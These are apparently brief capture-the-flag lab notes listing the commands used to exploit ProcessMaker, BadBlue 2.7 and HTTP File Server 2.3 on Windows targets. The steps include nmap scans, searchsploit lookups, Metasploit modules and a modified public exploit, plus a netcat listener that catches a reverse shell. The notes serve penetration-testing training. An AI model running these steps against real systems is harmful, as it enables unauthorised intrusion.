# Labs
### Lab: Windows - Workflow platform
1. scan
2. check credentials online for proccess maker
3. `searchsploit ProcessMaker` 
4. launch msfconsole
5. create workspace: workspace -a nameofworkspace
6. `search processmaker`
7. use 0
8. set RHOSTS 10.10.x.x -> run
9. get flag

### Lab: Windows: File and Keylogging
1. `nmap -sV 10.10.x.x`
2. `searchsploit badblue 2.7`
3. `msfconsole` -> `use exploit/windows/http/badblue_passthru` --> `set RHOSTS 10.0.0.71` --> run
4. `shell`
5. search flag

### Lab: HTTP File Server
1. scan: nmap
2. searchsploit: `searchsploit HTTP File Server 2.3`
3. copy to desktop: `searchsploit -m 39161`
4. vim(change exploit, IP, PORT): `vim 39161`
5. start pyhton server: `python -m SimpleHTTPServer 80`
6.  copy netcat:  `cp /usr/share/windows-resources/binaries/nc.exe .`
7. netcat: `nc -nvlp 443`
8. lunch script: `python39161.py 10.10.x.x 80`
9. get flag